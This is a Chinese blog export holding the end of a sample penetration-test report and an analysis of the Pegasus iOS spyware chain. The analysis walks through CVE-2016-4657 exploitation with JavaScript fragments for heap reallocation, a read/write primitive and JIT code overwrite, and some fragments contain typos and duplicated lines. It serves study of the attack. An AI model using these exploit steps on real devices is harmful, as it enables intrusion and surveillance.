<p>这次渗透测试完成了这些目标。一次攻击就可以获得所有的联合资产。许多被认为是小事的问题会被一起利用，造成了系统的沦陷。值得注意的是，整个Megacorp One安全基础设施的崩溃很大程度上归因于对网络边界和主机级别的访问控制不足。需要引进有效的网络分层系统以减轻因整个Megacorp One基础设施的级联安全故障所产生的影响。</p>
<h2 id="建议"><a href="#建议" class="headerlink" title="建议"></a>建议</h2><p>因为这次渗透暴露了整个系统架构，所以合适的资源分配可以确保修补工作可在短时间内完成。虽然需要修复的漏洞的完整表单不会提供，但一些高危漏洞需要说明。</p>
<p>安全建议如下：</p>
<ol>
<li>   确保组织的任何地方都使用了强凭证。在系统的不同安全层级上使用弱密码和相同的密码，会使攻击更加容易。可以参考NIST SP 800-11（<a href="http://csrc.nist.gov/publications/drafts/800-118/draft-sp800-118.pdf%EF%BC%89%E6%9D%A5%E5%88%B6%E5%AE%9A%E4%BC%81%E4%B8%9A%E7%9A%84%E5%AF%86%E7%A0%81%E6%9D%A1%E6%AC%BE%E3%80%82%E8%99%BD%E7%84%B6%E8%BF%99%E4%B8%AA%E9%97%AE%E9%A2%98%E5%AD%98%E5%9C%A8%E4%B8%8D%E5%B9%BF%EF%BC%8C%E4%BD%86%E4%BB%8D%E7%84%B6%E6%98%AF%E4%B8%AA%E9%97%AE%E9%A2%98%EF%BC%8C%E9%9C%80%E8%A6%81%E8%A7%A3%E5%86%B3%E3%80%82">http://csrc.nist.gov/publications/drafts/800-118/draft-sp800-118.pdf）来制定企业的密码条款。虽然这个问题存在不广，但仍然是个问题，需要解决。</a></li>
<li>   建立信任带。在内网中合适的地方建立信任逻辑边界。每个逻辑信任部分应相互联合，不能轻易破坏而连上其他部分。所以要使用不同的管理员账号，这样某一部分受损了，但不会影响到其他部分。</li>
<li>   在所有系统中实行变更控制：在不同的系统中都发现了配置错误和上传漏洞。通过变更控制可减轻这些漏洞带来的风险。</li>
<li>   实施补丁管理程序：按照NIST SP 800-40（<a href="http://csrc.nist.gov/publications/nistpubs/800-40-Ver2/SP800-40v2.pdf%EF%BC%89%E6%9D%A5%E5%88%9B%E5%BB%BA%E4%B8%80%E4%B8%AA%E8%A1%A5%E4%B8%81%E7%AE%A1%E7%90%86%E7%A8%8B%E5%BA%8F%EF%BC%8C%E8%BF%99%E5%AF%B9%E5%8F%AF%E6%8C%81%E7%BB%AD%E7%9A%84%E5%AE%89%E5%85%A8%E7%8E%AF%E5%A2%83%E6%9D%A5%E8%AF%B4%E6%98%AF%E4%B8%80%E4%B8%AA%E9%87%8D%E8%A6%81%E7%BB%84%E4%BB%B6%E3%80%82%E8%BF%99%E5%B0%86%E6%9C%89%E5%8A%A9%E4%BA%8E%E9%99%90%E5%88%B6%E7%94%B1%E4%BA%8E%E6%9C%AA%E4%BF%AE%E8%A1%A5%E8%80%8C%E5%AF%BC%E8%87%B4%E7%9A%84%E6%94%BB%E5%87%BB%E3%80%82">http://csrc.nist.gov/publications/nistpubs/800-40-Ver2/SP800-40v2.pdf）来创建一个补丁管理程序，这对可持续的安全环境来说是一个重要组件。这将有助于限制由于未修补而导致的攻击。</a></li>
<li>   施行常规漏洞评估。作为有效组织风险管理策略的一部分，漏洞评估要在常规部分执行。这有助于组织确定安全控制是否正确配置，操作是否如预期般执行，是否生成了想要的结果。参照NIST SP 800-30（<a href="http://csrc.nist.gov/publications/PubsDrafts.html#SP-800-30-Rev.%201%EF%BC%89%E5%BB%BA%E7%AB%8B%E9%AB%98%E6%95%88%E7%9A%84%E9%A3%8E%E9%99%A9%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E3%80%82">http://csrc.nist.gov/publications/PubsDrafts.html#SP-800-30-Rev.%201）建立高效的风险管理系统。</a><h3 id="风险等级"><a href="#风险等级" class="headerlink" title="风险等级"></a>风险等级</h3>对MegaCorp One风险评定的结果为高。外部攻击者可以获得整个系统的控制权。有理由相信一个恶意的组织能够施行有效的目标攻击。</li>
</ol>
<p> </p>
<h2 id="附录A：漏洞细节及减轻危害"><a href="#附录A：漏洞细节及减轻危害" class="headerlink" title="附录A：漏洞细节及减轻危害"></a>附录A：漏洞细节及减轻危害</h2><h3 id="风险等级范围"><a href="#风险等级范围" class="headerlink" title="风险等级范围"></a>风险等级范围</h3><p>鉴于NIST SP 800-30，漏洞按照相似性及影响排列。<br>默认的或弱的凭证<br>级别：高<br>描述：一个公共管理界面仅靠一个弱密钥保护。<br>影响：仅靠暴力破解，就可能爆出SQLite Manager服务的管理员密码。因为缺少额外的授权凭证，这也可能爆出所有用户密码哈希值。如果密码会重用，那么爆出明文密码可以进一步攻击目标系统。<br>修复：确保所有的管理界面受强密码或口令保护。避免使用普通的或和业务相关的密码，因为可以很容易通过字典生成。</p>
<h3 id="密码重用"><a href="#密码重用" class="headerlink" title="密码重用"></a>密码重用</h3><p>级别：高<br>描述：“mike“在SQLite Manager和个人计算机上用了相同的密码。<br>影响：重复用相同的密码是一个非常差的习惯，应该尽量避免。这个漏洞的影响很恶劣，因为外部攻击者直接获得了内网计算机的有效凭证。这可能暴露更多的可攻击的界面。<br>修复：升级密码管理策略，所有隔离服务强制使用复杂的，不同的密码。密码管理系统要使雇员方便的使用不同的密码进入不同的系统。</p>
<h3 id="共享本地管理员密码"><a href="#共享本地管理员密码" class="headerlink" title="共享本地管理员密码"></a>共享本地管理员密码</h3><p>级别：高<br>描述：多台主机使用了相同的本地管理员密码。<br>影响：MegaCorp One使用组策略来设置GPO内所有主机的本地管理员密码。结果，攻击者就可以利用著名的攻击工具“PASS-THE-HASH“来攻击，登录所有使用相同密码及相同密码哈希值的主机。如此，攻击者不用破译密码哈希值，大大增加了安全风险。<br>修复：强烈建议禁止使用本地管理员账户。实在要用的话，应分配一个不同的名字及复杂随机的密码。</p>
<h3 id="补丁管理"><a href="#补丁管理" class="headerlink" title="补丁管理"></a>补丁管理</h3><p>级别：高<br>描述：MegaCorp One内外部环境中有许多未打补丁的系统和程序。<br>影响：弱授权机制和未打补丁的主机，都包含可以用爆破的漏洞，这会使得攻击者以未授权的方式得到大量的公司资产。特别地，例如SQLiite Manager包含远程执行代码的漏洞，底层主机也有一个本地提权的漏洞，这些可以使对外开放的主机轻易地被攻陷。表明了补丁管理策略以及强制执行的不足。<br>修复：所有的公司资产都要及时打上供应商提供的补丁。要完成这些可以使用供应商官方工具或者第三方程序，这些都能检查出未应用的补丁。在许多例子中，第三方工具也可以用来在一个混乱的环境中进行补丁部署。</p>
<h3 id="DNS区域传送"><a href="#DNS区域传送" class="headerlink" title="DNS区域传送"></a>DNS区域传送</h3><p>级别：低<br>描述：一个错误配置的DNS服务器允许无限制的区域传送。<br>影响：一个配置成可与任何DNS服务器传输数据的DNS服务器，会泄露关于公司资产和网络布局等敏感信息。<br>修复：DNS区域传送需仅对已证明的服务器开放。</p>
<h3 id="默认APACHE文件目录"><a href="#默认APACHE文件目录" class="headerlink" title="默认APACHE文件目录"></a>默认APACHE文件目录</h3><p>级别：低<br>描述：在admin.megacorpone.com主机上发现了默认的Apache文件目录。<br>影响：攻击者通过检查默认文件夹可能猜出Apache服务器的版本。敏感信息也可能泄露。<br>修复：移除公开网站的所有默认文件。</p>
<h2 id="附录B-关于Offensive-Security"><a href="#附录B-关于Offensive-Security" class="headerlink" title="附录B:关于Offensive Security"></a>附录B:关于Offensive Security</h2><p>Offensive Security提倡黑盒渗透测试而反对白盒渗透测试。白盒渗透测试近几年来很火，因为在仅要实现常规需求的地方，简化了评估方法。其作为漏洞扫描方法，会有选择的确认发现的问题。这让服务供应商有能力扩大工作量，因为使用了自动化的工具，并且通过证书维持产品间的联动。<br>黑盒是在受控环境下的攻击模拟形式，非常接近现实环境，组织会时不时的面临攻击。黑盒测试是基于目标的评估方法，不仅仅是发现一个简单的漏洞，而是提供一个漏洞真正的商业影响。黑盒测试会找到那些修复后能带来最高商业回报的区域。<br>黑盒测试通常需要很高的专业知识。正如报告中显示的那样，Offensive Security坚信当进行黑盒测试时输出正确有效的结果是检验合格的唯一方式，因为我们专业的安全团队运用了很高专业知识。Offensive Security会集中力量进行渗透测试或着其他参与的项目。这意味着无论什么都参与到提供服务中，例如标准工具Kali Linux，畅销书的作者，O-day漏洞的发现者，或是如Exploit-DB的维护者。<br>Offensive Security提供的产品与市场需求不配对。然而，我们不会适合任一工作。Offensive Security特别提供咨询服务，底容量和高质量的比例使得员工能更接近的模拟现实世界的攻击。这也允许在保持成本合理的同时，客户可以更多地获得行业认可的专业知识。例如，大批量/快速周转服务通常不适合我们。Offensive Security专注与领导高质量，高影响的评估活动，积极地寻求其他供应商无法提供服务的客户。<br>请通过<a href="mailto:&#105;&#110;&#102;&#111;&#x40;&#x6f;&#102;&#102;&#115;&#101;&#99;&#46;&#x63;&#x6f;&#x6d;">&#105;&#110;&#102;&#111;&#x40;&#x6f;&#102;&#102;&#115;&#101;&#99;&#46;&#x63;&#x6f;&#x6d;</a>联系我们。</p>
]]></content>
      <tags>
        <tag>penetation test</tag>
      </tags>
  </entry>
  <entry>
    <title>pegasus分析</title>
    <url>/2019/04/16/pegasus%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<h1 id="PEGASUS攻击分析"><a href="#PEGASUS攻击分析" class="headerlink" title="PEGASUS攻击分析"></a>PEGASUS攻击分析</h1><h6 id="参考-lookout-report"><a href="#参考-lookout-report" class="headerlink" title="参考 lookout report"></a>参考 <a href="https://info.lookout.com/rs/051-ESQ-475/images/pegasus-exploits-technical-details.pdf" title="lookout report">lookout report</a></h6><h3 id="攻击过程"><a href="#攻击过程" class="headerlink" title="攻击过程"></a>攻击过程</h3><p>受害者点击链接之后，攻击者展开攻击。攻击分为三个阶段，每个阶段都包含了攻击模块代码和隐蔽软件。攻击是线性的，每个阶段都依赖于上个阶段的代码、隐蔽软件的成功，每个阶段都使用了关键的0day漏洞，以确保进攻成功进行。</p>
<h5 id="阶段一"><a href="#阶段一" class="headerlink" title="阶段一"></a>阶段一</h5><p>传送并利用WebKit漏洞，通过HTML文件利用WebKit中的CVE-2016-4657漏洞。</p>
<h5 id="阶段二"><a href="#阶段二" class="headerlink" title="阶段二"></a>阶段二</h5><p>越狱。在第一阶段中会根据设备（32/64位）下载相应的，经过加密混淆的包。每次下载的包都是用独一无二的key加密的。软件包内包含针对iOS内核两个漏洞(CVE-2016-4655和CVE-2016-4656)的exp还有一个用来下载解密第三阶段软件包的loader。</p>
<a id="more"></a>

<h5 id="阶段三"><a href="#阶段三" class="headerlink" title="阶段三"></a>阶段三</h5><p>安装间谍软件。经过了第二阶段的越狱，第三阶段中，攻击者会选择需要监听的软件，把hook安装到应用中。另外，第三阶段还会检查设备之前有没有通过其他方式越狱过，如果有，则会移除之前越狱后开放的系统访问权限，如ssh。软件还有一个“故障保险“，如果检测到设备满足某些条件，软件就会自毁。</p>
<p>第三阶段中，间谍会部署一个test222.tar文件，这是一个tar包，包中包含各种实现各种目的的文件，如实现中间人攻击的根TLS证书、针对Viber、Whatsapp的嗅探库、专门用于通话录音的库等。</p>
<h2 id="CVE-2016-4657"><a href="#CVE-2016-4657" class="headerlink" title="CVE-2016-4657"></a>CVE-2016-4657</h2><p>第一阶段用到了<strong>WebKit’s JavaScriptCore library</strong> 中的漏洞<strong>CVE-2016-4657</strong>。让Safari运行一段JavaScript payload，以此来获得Safari WebContent进程的代码执行权。</p>
<h4 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h4><p>MarkedArgumentBuffer中的<strong>slowAppend()**函数中存在这个漏洞，并且可以在静态方法</strong>definePropertries()**中使用MarkedArgumentBuffer来利用这个漏洞。definePropertries()接受一个对象，这个对象的可枚举变量构成要在另一个目标对象上定义或修改的属性的描述符。算法链接这些变量和目标对象，基于变量列表进行两次迭代。在第一个部分，检查每个变量的格式，并创建一个有默认值的PropertyDescriptor对象。<br> <figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">size_t numProperties = propertyName.size();</span><br><span class="line">Vector&lt;PropertyDescriptor&gt; descriptors;</span><br><span class="line">size_t numProperties = propertyName.size();</span><br><span class="line">Vector&lt;PropertyDescriptor&gt; descriptors;</span><br><span class="line">MarkedArgumentBuffer markBuffer;</span><br><span class="line"><span class="function"><span class="title">for</span>(<span class="params">size_t i =<span class="number">0</span>;i&lt;numProperties;i++</span>)</span>&#123;</span><br><span class="line">	JSValue prop = properties-&gt;get(exec,propertyNames[i]);</span><br><span class="line">	<span class="keyword">if</span>(exec-&gt;hadException())</span><br><span class="line">		<span class="keyword">return</span> jsNull();</span><br><span class="line">	PropertyDescriptor descriptor;</span><br><span class="line">	<span class="keyword">if</span>(!toPropertyDescriptor(exec, prop,descriptor))</span><br><span class="line">		<span class="keyword">return</span> jsNull();</span><br><span class="line">	descriptors.append(descriptor);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>如果每一个变量都是有效的，那么第二部分就会执行。这个部分将用户提供的属性变量与目标对象结合在一起，通过defineOwnProperty()实现。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">for</span>(<span class="params">size_t i=<span class="number">0</span>;i&lt;numProperties; i++</span>)</span>&#123;</span><br><span class="line">	Identifier propertyName = propertyNames[i];</span><br><span class="line">	<span class="keyword">if</span>(exec-&gt;propertyName().isPrivateName(properName))</span><br><span class="line">		<span class="keyword">continue</span>;</span><br><span class="line">	</span><br><span class="line">	object-&gt;methodTable(exec-&gt;vm())-&gt;defineOwnProperty(object, exec, propertyName,descriptors[i],<span class="literal">true</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这个方法可能调用用户自定义的JavaScript方法（使用已定义的属性）。这样，内存回收会被触发，导致未标记的堆备份重新分配。因此，对descriptor向量PropertyDescriptor存储的对象的引用要独立标记，确保不被回收。这里，使用了<strong>MarkedArgumentBuffer</strong>，临时存储变量值，防止被回收。</p>
<p>首先，来理解JavaScriptCore的垃圾回收机制，当对象不在被使用，或者WebContentjin进程占用更多内存的时候会回收内存。系统会遍历栈，确定对象是否被引用。堆中也可能引用对象，但只在特殊情况中。</p>
<p>MarkedArgumentBuffer维持一个<strong>inline</strong>栈表，由各个值组成。但进行垃圾回收时，每个值会被标记，其代表的对象就会避免回收释放。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MarkedArgumentBuffer</span> </span>&#123;</span><br><span class="line">	...</span><br><span class="line">	private:</span><br><span class="line">		<span class="keyword">static</span> <span class="keyword">const</span> size_t inlineCapacity=<span class="number">8</span>;</span><br><span class="line">	...</span><br><span class="line">	public:</span><br><span class="line">	...</span><br><span class="line">		MarkedArgumentBuffer()</span><br><span class="line">			:m_size(<span class="number">0</span>)</span><br><span class="line">			,m_capacity(inlineCapacity)</span><br><span class="line">			,m_buffer(m_inlineBuffer)</span><br><span class="line">			,m_markSet(<span class="number">0</span>)</span><br><span class="line">		&#123;</span><br><span class="line">		&#125;</span><br><span class="line">	...</span><br><span class="line">		<span class="keyword">void</span> <span class="function"><span class="title">append</span>(<span class="params">JSValue v</span>)</span>&#123;</span><br><span class="line">		<span class="keyword">if</span>(m_size &gt;= m_capacity)</span><br><span class="line">			<span class="keyword">return</span> slowAppend(v);</span><br><span class="line">		</span><br><span class="line">		slotFor(m_size)=JSValue::encode(v);</span><br><span class="line">		++m_size;</span><br><span class="line">	&#125;</span><br><span class="line">	...</span><br><span class="line">	private:</span><br><span class="line">	...</span><br><span class="line">		int m_size;</span><br><span class="line">		int m_capacity;</span><br><span class="line">		EncodedJSValue m_inlineBuffer[inlineCapacity];</span><br><span class="line">		EncodeedJSValue* m_buffer;</span><br><span class="line">		ListSet* m_markSet;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>inline栈只能存8个值。当向MarkedArgumentBuffer添加第九个值时，就移到堆中，能够存储的值也扩大了。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">void</span> MarkedArgumentBuffer::<span class="function"><span class="title">slowAppend</span>(<span class="params">JSValue v</span>)</span>&#123;</span><br><span class="line">	int newCapacity = m_capacity*<span class="number">4</span>;</span><br><span class="line">	EncodedJSValue* newBuffer = <span class="keyword">new</span> EncodeedJSValue[newCapacity];</span><br><span class="line">	<span class="keyword">for</span>(int i=<span class="number">0</span>;i&lt;m_capacity;++i)</span><br><span class="line">		newBuffer[i]=m_buffer[i];</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">if</span> (EncodedJSValue* base=mallocBase())</span><br><span class="line">		<span class="keyword">delete</span> [] base;</span><br><span class="line">	</span><br><span class="line">	m_buffer=newBuffer;</span><br><span class="line">	m_capacity=newCapacity;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>一旦移动到堆中，这些值就不再被垃圾回收机制保护。MarkedArgumentBuffer里的值会添加到堆中的<strong>m_markListSet</strong>并被标记，确保不会释放回收。当MarkedArgumentBuffer移到堆中时，也要移动<strong>markListSet</strong>中。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">//As long as our size stays within our Vetor&#x27;s inline</span></span><br><span class="line"><span class="comment">//capacity, all our values are allocated on the stack, and </span></span><br><span class="line"><span class="comment">//therefore don&#x27;t need explicit marking. Once our size exceeds </span></span><br><span class="line"><span class="comment">//our Vector&#x27;s inline capacity, though, our values move to the </span></span><br><span class="line"><span class="comment">//heap, where they do need explicit marking.</span></span><br><span class="line"><span class="keyword">for</span> (int i=<span class="number">0</span>; i&lt;m_size;++i)&#123;</span><br><span class="line">	Heap* heap=Heap::heap(JSValue::decode(slotFor(i)));</span><br><span class="line">	<span class="keyword">if</span>(!heap)</span><br><span class="line">		<span class="keyword">continue</span>;</span><br><span class="line">	</span><br><span class="line">	m_markSet = &amp;heap-&gt;markListSet();</span><br><span class="line">	m_markSet-&gt;add(<span class="built_in">this</span>);</span><br><span class="line">	<span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>上面的代码请求了一个堆，把MarkedArgumentBuffer添加到堆中的markListSet。但只有第九个值加入MarkedArgumentBuffer才调用。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">inline Heap* Heap::<span class="function"><span class="title">heap</span>(<span class="params"><span class="keyword">const</span> JSValue v</span>)</span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(!v.isCell())</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">return</span> heap(v.asCell());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>JSValue</strong>有一个tag，说明它编码的值的类型。在一个复杂的对象中，tag为CellTag，JSValue创建一指针指向堆中的值。对简单类型来说，变量可以直接解码成JSValue（例如整形，布尔型，null，还有未定义的），在堆中存储这样的值是多余的，还会创建一个tag。**JSValue::isCell() **函数决定是否在堆中创建指针指向单元格。因为简单类型不会指向堆，为这些类型指定堆没有意义，只会返回null。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">inline bool JSValue::isCell() <span class="keyword">const</span>&#123;</span><br><span class="line">	<span class="keyword">return</span> !(u.asInt64&amp;TagMask);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>因此，如果要添加到MarkedArgumentBuffer的第九个值不是一个堆备份值，当请求堆时会返回NULL， MarkedArgumentBuffer也不会添加到堆markListSet中。MarkedArgumentBuffer就不在起作用，第九个值以后的值可以被释放回收。descriptor向量里的堆值，被引用后，可能会被污染。实际上，对这些值的另一个引用仍然存在（defineDescriptor()有JavaScript的变量）。在垃圾回收前，余下的JSValue的引用必须先移去，以使descriptor向量里的引用被污染。<br><a href="https://imgchr.com/i/ESiMgf"><img src="https://s2.ax1x.com/2019/04/18/ESiMgf.png" alt="ESiMgf.png"></a><br>调用defineOwnDescriptor()一定会调用基于属性值的用户控制的方法。结果，最后一个对一属性值的引用可以被用户定义的JavaScript代码移去。如果垃圾回收在移去一特定值的所有引用和目标对象desceiptor向量里的值时被触发，这些释放了的空间会作为一个变量存储在目标对象上。</p>
<h4 id="攻击"><a href="#攻击" class="headerlink" title="攻击"></a>攻击</h4><p>Pegasus通过向defineProperties()函数传入一系列精心制作的变量来触发这个漏洞。当这些独立变量连续添加到MarkedArgumentBuffer，这个漏洞就会触发，如果垃圾回收在关键时候及时触发，JSArray会错误释放。因为垃圾回收不一定会被触发，所以重复攻击以触发错误释放和再分配（会尝试十次），还会测试是否一个被污染的引用已经成功获得。假设垃圾回收正确触发，那么另一个对象就会分配在污染的JSArray之上。接着，设置可以获得本地代码执行权的工具，即读写权限，获取任意JavaScript对象位置。一旦这些步骤都完成了，就会创建一个payload可执行代码集。</p>
<h5 id="设置触发漏洞"><a href="#设置触发漏洞" class="headerlink" title="设置触发漏洞"></a>设置触发漏洞</h5><p>攻击使用一个JSArray对象触发漏洞代码块，获得任意代码执行权。下面这段代码触发漏洞。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> arr=<span class="keyword">new</span> <span class="built_in">Array</span>(<span class="number">2047</span>);</span><br><span class="line"><span class="keyword">var</span> not_number=&#123;&#125;;</span><br><span class="line">not_number.toString=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	arr=<span class="literal">null</span>;</span><br><span class="line">	props[<span class="string">&quot;stale&quot;</span>][<span class="string">&#x27;value&#x27;</span>]=<span class="literal">null</span>;</span><br><span class="line">	...<span class="comment">//Trigger garbage collection and reallocation over stale object</span></span><br><span class="line">	<span class="keyword">return</span> <span class="number">10</span>;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">var</span> props=&#123;</span><br><span class="line">	p0:&#123;<span class="attr">value</span>:<span class="number">0</span>&#125;,</span><br><span class="line">	p1:&#123;<span class="attr">value</span>:<span class="number">1</span>&#125;,</span><br><span class="line">	p2:&#123;<span class="attr">value</span>:<span class="number">2</span>&#125;,</span><br><span class="line">	p3:&#123;<span class="attr">value</span>:<span class="number">3</span>&#125;,</span><br><span class="line">	p4:&#123;<span class="attr">value</span>:<span class="number">4</span>&#125;,</span><br><span class="line">	p5:&#123;<span class="attr">value</span>:<span class="number">5</span>&#125;,</span><br><span class="line">	p6:&#123;<span class="attr">value</span>:<span class="number">6</span>&#125;,</span><br><span class="line">	p7:&#123;<span class="attr">value</span>:<span class="number">7</span>&#125;,</span><br><span class="line">	p8:&#123;<span class="attr">value</span>:<span class="number">8</span>&#125;,</span><br><span class="line">	length:&#123;<span class="attr">value</span>:not_number&#125;,</span><br><span class="line">	stale:&#123;<span class="attr">value</span>:arr&#125;,</span><br><span class="line">	after:&#123;<span class="attr">value</span>:<span class="number">666</span>&#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">var</span> target=[];</span><br><span class="line"><span class="built_in">Object</span>.defineProperties(target,props);</span><br></pre></td></tr></table></figure>
<p>经过特别精心编排的props对象触发slowAppend()内的漏洞。当第九个属性值添加到MarkedArgumentBuffer(P8)，slowAppend()将无法获得堆地址（因为这个值是一个简单类型，即整形，并且原先堆上没有这个值）。那么，MarkedArgumentBuffer就不能保护堆备份值（not_number和arr），当垃圾回收时就会被释放。</p>
<p>当defineOwnDescriptor()接受这个长属性值，它会尝试将这个值（not_number）转变为一个数字。如下所示，toString()被调用，移去arr的后两项引用。一旦移去，JSArray将取消标记，下一次垃圾回收就会释放整个对象。Pegasus通过toString()方法申请分配内存空间，促使垃圾回收运行（释放arr对象）。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> attempts=<span class="keyword">new</span> <span class="built_in">Array</span>(<span class="number">4250000</span>);</span><br><span class="line"><span class="keyword">var</span> pressure=<span class="keyword">new</span> <span class="built_in">Array</span>(<span class="number">100</span>);</span><br><span class="line">...</span><br><span class="line">not_number.toString=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	...</span><br><span class="line">	<span class="function"><span class="title">for</span>(<span class="params"><span class="keyword">var</span> i=<span class="number">0</span>;i&lt;pressure.length;i++</span>)</span>&#123;</span><br><span class="line">		pressure[i]=<span class="keyword">new</span> Unit32Array(<span class="number">262144</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">var</span> buffer=<span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">80</span>);</span><br><span class="line">	<span class="keyword">var</span> unitArray=<span class="keyword">new</span> Unit32Array(buffer);</span><br><span class="line">	unitArray[<span class="number">0</span>]=<span class="number">0xAABBCCDD</span>;</span><br><span class="line">	<span class="function"><span class="title">for</span>(<span class="params">i =<span class="number">0</span>;i&lt;attempts.length;i++</span>)</span>&#123;</span><br><span class="line">		attempts[i]=<span class="keyword">new</span> Unit32Array(buffer);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>attempts每一项都在同一段缓冲区上分配4.25 million个Unit32Array。在arr对象使用的同一内存区再分配一系列的Unit32Array。</p>
<p>完成后，会检测垃圾回收是否触发。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> before_len=arr.length;</span><br><span class="line"><span class="built_in">Object</span>.defineProperties(target,props);</span><br><span class="line">stale=targets.stale;</span><br><span class="line"><span class="keyword">var</span> after_len=stale.length;</span><br><span class="line"><span class="function"><span class="title">if</span>(<span class="params">before_len==after_len</span>)</span>&#123;</span><br><span class="line">	<span class="keyword">throw</span> <span class="keyword">new</span> RecoverableException(<span class="number">8</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>如果JSArray的长度没有改变，要么垃圾回收没有触发，要么是Unit32Array没有在stale相同地址上分配空间。这种情况，攻击就失败了，但会再尝试。</p>
<h4 id="获取任意读写原语"><a href="#获取任意读写原语" class="headerlink" title="获取任意读写原语"></a>获取任意读写原语</h4><p>假设攻击已经成功了，那么在同一段的内存中有两个不同类型的对象。第一个是JSArray(已污染)，第二个是众多已分配的Unit32Arrays中的一个（实际上，默认类型是 JSGenericTypedArrayView）。通过对污染对象的读写，可以读取或破环JSGenericTypedArrayView的成员变量。特别地，在JSArray和JSGenericTypedArrayView长度重叠的地方，写入一个偏移量，就可以有效地设置Unit32Array的长度为0xFFFFFFFF。破环这个值，可以将这个array作为WebContent进程的全部虚拟地址空间（即任意读写原语）。</p>
<p>攻击需要确定已分配的众多Unit32Array中哪一个与污染对象匹配。可以一一测试，并检查长度是否被改为0xFFFFFFFF。所有其他数组仍将保留原始的备份ArrayBuffer。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">for</span>(<span class="params">x=attempts.length-<span class="number">1</span>;x&gt;=<span class="number">1</span>;x--</span>)</span>&#123;</span><br><span class="line">	<span class="function"><span class="title">if</span>(<span class="params">attempts[x].length != <span class="number">80</span>/<span class="number">4</span></span>)</span>&#123;</span><br><span class="line">		<span class="function"><span class="title">if</span>(<span class="params">attempts[x].length==<span class="number">0xFFFFFFFF</span></span>)</span>&#123;</span><br><span class="line">			memory_view=attempts[x];</span><br><span class="line">			...</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="获取对象地址"><a href="#获取对象地址" class="headerlink" title="获取对象地址"></a>获取对象地址</h4><p>完成攻击的最后组件需要能够获取任意JavaScript对象的地址。Pegasus用破坏Unit32Array的方法来获取地址。向对象写入一偏移值，Unit32Array的缓冲区就被破坏，并指向用户控制的JSArray。JSArray的第一个元素设置成需要爆破的JavaScript对象（通过损坏指向uint32数组的底层存储的指针），可以从Unit32Array中读取地址信息。</p>
<h4 id="本地代码执行"><a href="#本地代码执行" class="headerlink" title="本地代码执行"></a>本地代码执行</h4><p>Pegasus第一段段余下要做的是创建一个可执行代码集，这个集合包含了要被执行的恶意代码。创建一个JSFunction对象（包含上百个之后会被重写的try/catch块）完成这项工作。为确保JIT编译成本机代码，这个函数会被重复调用。这样，这个函数会被标记为会经常调用并不会释放的高优先级代码。因为JavaScriptCode编译器运行JSTed代码的独特方式，代码会存储在可以读写运行的内存区。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> body=<span class="string">&#x27; &#x27;</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> k=<span class="number">0</span>;k&lt;<span class="number">0x600</span>;k++)&#123;</span><br><span class="line">	body+=<span class="string">&#x27;try &#123;&#125; catch(e);&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> to_overwrite=<span class="keyword">new</span> <span class="built_in">Function</span>(<span class="string">&#x27;a&#x27;</span>,body);</span><br><span class="line"><span class="function"><span class="title">for</span>(<span class="params"><span class="keyword">var</span> i=<span class="number">0</span>;i&lt;<span class="number">0x1000</span>;i++</span>)</span>&#123;</span><br><span class="line">	to_overwrite();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可以获得JSFunction对象的地址，并且通过读取不同的成员变量，可以获得RWX的映射。接着JSFed的try/catch块会被恶意代码替换。通过调用to_overwrite()函数，可以轻松取得任意代码执行权。</p>
<h4 id="回避检测"><a href="#回避检测" class="headerlink" title="回避检测"></a>回避检测</h4><p>当攻击失败，Pegasus有一个紧急拯救代码，很可能是创建内核崩溃转储而防止暴露这个漏洞。代码在一个空引用上触发崩溃。当分析师分析这样的情况会马上认为这个BUG为非法空指针引用而不会怀疑是恶意攻击。</p>
